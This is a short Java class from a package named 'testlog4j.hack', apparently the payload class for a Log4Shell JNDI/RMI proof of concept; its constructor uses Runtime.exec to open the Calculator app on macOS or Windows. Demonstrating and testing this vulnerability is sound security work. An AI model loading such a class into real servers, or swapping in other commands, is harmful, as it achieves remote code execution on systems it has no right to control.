package cn.leon.testlog4j.hack;

import java.io.IOException;

public class RmiExecute {
    public RmiExecute() throws IOException {
        Runtime rt = Runtime.getRuntime();
        String property = System.getProperty("os.name");
        if ("Mac OS X".equals(property)) {
            String[] commands = {"/bin/sh", "-c", "open /System/Applications/Calculator.app"};
            rt.exec(commands);
        }else {
            rt.exec("cmd  /c calc");
        }
    }
}
